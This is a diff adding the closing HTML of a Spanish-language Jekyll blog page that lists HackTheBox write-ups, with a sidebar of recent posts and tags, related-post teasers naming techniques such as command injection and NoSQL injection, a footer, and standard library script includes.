+
+
+  </div><!-- .post-tail-bottom -->
+
+</div><!-- div.post-tail-wrapper -->
+
+
+      
+    
+    
+
+    </div>
+  </div> <!-- #core-wrapper -->
+
+  <!-- pannel -->
+  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">
+
+    <div class="access">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div id="access-lastmod" class="post">
+    <div class="panel-heading">Actualizado recientemente</div>
+    <ul class="post-content pl-0 pb-1 ml-1 mt-2">
+      
+        
+        
+        
+      <li><a href="/posts/ambassador-writeup/">Ambassador WriteUp</a></li>
+      
+        
+        
+        
+      <li><a href="/posts/precious-writeup/">Precious WriteUp</a></li>
+      
+        
+        
+        
+      <li><a href="/posts/tty/">Tratamiento de la TTY</a></li>
+      
+        
+        
+        
+      <li><a href="/posts/shoppy-writeup/">Shoppy WriteUp</a></li>
+      
+        
+        
+        
+      <li><a href="/posts/photobomb-writeup/">Photobomb WriteUp</a></li>
+      
+    </ul>
+  </div> <!-- #access-lastmod -->
+
+
+
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <div id="access-tags">
+    <div class="panel-heading">Etiquetas populares</div>
+    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">
+
+    
+      
+      <a class="post-tag" href="/tags/easy/">easy</a>
+    
+      
+      <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
+    
+      
+      <a class="post-tag" href="/tags/writeup/">writeup</a>
+    
+      
+      <a class="post-tag" href="/tags/command-injection/">command injection</a>
+    
+      
+      <a class="post-tag" href="/tags/directory-transversal/">directory transversal</a>
+    
+      
+      <a class="post-tag" href="/tags/arbitrary-file-read/">arbitrary file read</a>
+    
+      
+      <a class="post-tag" href="/tags/docker/">docker</a>
+    
+      
+      <a class="post-tag" href="/tags/grafana/">grafana</a>
+    
+      
+      <a class="post-tag" href="/tags/medium/">medium</a>
+    
+      
+      <a class="post-tag" href="/tags/no-sql/">no sql</a>
+    
+
+    </div>
+  </div>
+
+
+    </div>
+
+    
+      
+      
+
+
+
+<!-- BS-toc.js will be loaded at medium priority -->
+<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
+
+<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
+  <div class="panel-heading pl-3 pt-2 mb-2">Contenido</div>
+  <nav id="toc" data-toggle="toc"></nav>
+</div>
+
+
+    
+  </div>
+
+</div>
+
+<!-- tail -->
+
+<div class="row">
+  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4">
+    
+      
+      <!--
+ Recommend the other 3 posts according to the tags and categories of the current post,
+ if the number is not enough, use the other latest posts to supplement.
+-->
+
+<!-- The total size of related posts  -->
+
+
+<!-- An random integer that bigger than 0  -->
+
+
+<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->
+
+
+
+
+
+
+
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+<!-- Fill with the other newlest posts  -->
+
+
+
+
+
+  <div id="related-posts" class="mb-2 mb-sm-4">
+    <h3 class="pt-2 mb-4 ml-1"
+      data-toc-skip>Lecturas adicionales</h3>
+    <div class="card-deck mb-4">
+    
+      
+      
+      <div class="card">
+        <a href="/posts/photobomb-writeup/">
+          <div class="card-body">
+            <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+
+<em class="small"
+    data-ts="1675440000"
+    data-df="YYYY-MM-DD"
+    >
+  2023-02-03
+</em>
+
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Photobomb WriteUp</h3>
+            <div class="text-muted small">
+              <p>
+                
+
+
+
+
+
+                Hoy tocará explotar la máquina Photobomb de HackTheBox, es de dificultad fácil. Haremos un command injection y para la escalada haremos un Path Hijacking
+
+Escaneo NMAP
+
+Antes de empezar les recomie...
+              </p>
+            </div>
+          </div>
+        </a>
+      </div>
+    
+      
+      
+      <div class="card">
+        <a href="/posts/shoppy-writeup/">
+          <div class="card-body">
+            <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+
+<em class="small"
+    data-ts="1673625600"
+    data-df="YYYY-MM-DD"
+    >
+  2023-01-13
+</em>
+
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shoppy WriteUp</h3>
+            <div class="text-muted small">
+              <p>
+                
+
+
+
+
+
+                Les explicaré cómo comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la esc...
+              </p>
+            </div>
+          </div>
+        </a>
+      </div>
+    
+      
+      
+      <div class="card">
+        <a href="/posts/ambassador-writeup/">
+          <div class="card-body">
+            <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+
+<em class="small"
+    data-ts="1673884800"
+    data-df="YYYY-MM-DD"
+    >
+  2023-01-16
+</em>
+
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Ambassador WriteUp</h3>
+            <div class="text-muted small">
+              <p>
+                
+
+
+
+
+
+                Les explicare cómo comprometer la máquina Ambassador de HackTheBox, Nos enfrentaremos a una version de Grafana la cual cuenta con un
+a vulnerabilidad de tipo Directory Transversal y Arbitrary File ...
+              </p>
+            </div>
+          </div>
+        </a>
+      </div>
+    
+    </div> <!-- .card-deck -->
+  </div> <!-- #related-posts -->
+
+
+    
+      
+      <!--
+  Navigation buttons at the bottom of the post.
+-->
+
+<div class="post-navigation d-flex justify-content-between">
+  
+  <a href="/posts/photobomb-writeup/" class="btn btn-outline-primary"
+    prompt="Anterior">
+    <p>Photobomb WriteUp</p>
+  </a>
+  
+
+  
+  <div class="btn btn-outline-primary disabled"
+    prompt="Nuevo">
+    <p>-</p>
+  </div>
+  
+
+</div>
+
+    
+      
+      <!--  The comments switcher -->
+
+
+    
+  </div>
+</div>
+
+
+
+        <!-- The Footer -->
+
+<footer class="row pl-3 pr-3">
+  <div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0">
+    <div class="footer-left">
+      <p class="mb-0">
+        © 2023
+        <a href="https://twitter.com/mortzelo">H4ckerLite</a>.
+        
+        <span data-toggle="tooltip" data-placement="top"
+          title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span>
+        
+      </p>
+    </div>
+
+    <div class="footer-right">
+      <p class="mb-0">
+        
+
+        
+
+        Hecho con 
+          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
+         usando el tema 
+          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
+        .
+
+      </p>
+    </div>
+
+  </div>
+
+</footer>
+
+
+      </div>
+
+      <!--
+  The Search results
+-->
+<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
+  <div class="col-12 col-sm-11 post-content">
+    <div id="search-hints">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <div id="access-tags">
+    <div class="panel-heading">Etiquetas populares</div>
+    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">
+
+    
+      
+      <a class="post-tag" href="/tags/easy/">easy</a>
+    
+      
+      <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
+    
+      
+      <a class="post-tag" href="/tags/writeup/">writeup</a>
+    
+      
+      <a class="post-tag" href="/tags/command-injection/">command injection</a>
+    
+      
+      <a class="post-tag" href="/tags/directory-transversal/">directory transversal</a>
+    
+      
+      <a class="post-tag" href="/tags/arbitrary-file-read/">arbitrary file read</a>
+    
+      
+      <a class="post-tag" href="/tags/docker/">docker</a>
+    
+      
+      <a class="post-tag" href="/tags/grafana/">grafana</a>
+    
+      
+      <a class="post-tag" href="/tags/medium/">medium</a>
+    
+      
+      <a class="post-tag" href="/tags/no-sql/">no sql</a>
+    
+
+    </div>
+  </div>
+
+
+    </div>
+    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
+  </div>
+</div>
+
+
+    </div> <!-- #main-wrapper -->
+
+    
+
+    <div id="mask"></div>
+
+    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
+      <i class="fas fa-angle-up"></i>
+    </a>
+
+    
+      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
+        data-animation="true" data-autohide="false">
+        <div class="toast-header">
+          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
+            <span aria-hidden="true">&times;</span>
+          </button>
+        </div>
+        <div class="toast-body text-center pt-0">
+          <p class="pl-2 pr-2 mb-3">Hay una nueva versión de contenido disponible.</p>
+          <button type="button" class="btn btn-primary" aria-label="Update">
+            Actualizar
+          </button>
+        </div>
+      </div>
+    
+
+    <!--
+  Jekyll Simple Search loader
+  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
+-->
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>
+
+<script>
+SimpleJekyllSearch({
+  searchInput: document.getElementById('search-input'),
+  resultsContainer: document.getElementById('search-results'),
+  json: '/assets/js/data/search.json',
+  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
+  noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>',
+  templateMiddleware: function(prop, value, template) {
+    if (prop === 'categories') {
+      if (value === '') {
+        return `${value}`;
+      } else {
+        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
+      }
+    }
+
+    if (prop === 'tags') {
+      if (value === '') {
+        return `${value}`;
+      } else {
+        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
+      }
+    }
+  }
+});
+</script>
+
+
+    <!--
+  JS selector for site.
+-->
+
+<!-- layout specified -->
+
+
+  
+
+
+
+  <!-- image lazy-loading & popup & clipboard -->
+  
+
+  
+
+
+
+
+
+
+
+  
+    
+
+    
+
+  
+
+
+
+  
+    
+
+    
+
+  
+
+
+
+  
+    
+
+    
+
+  
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+  
+    
+
+    
+
+  
+
+
+
+  
+    
+
+    
+
+  
+
+
+
+  
+    
+
+    
+
+  
+
+
+
+  
+    
+
+    
+
+  
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>
+
+
+
+
+
+
+
+
+<script defer src="/assets/js/dist/post.min.js"></script>
+
+
+
+<!-- commons -->
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>
+
+
+
+
+  </body>
+
+</html>
+
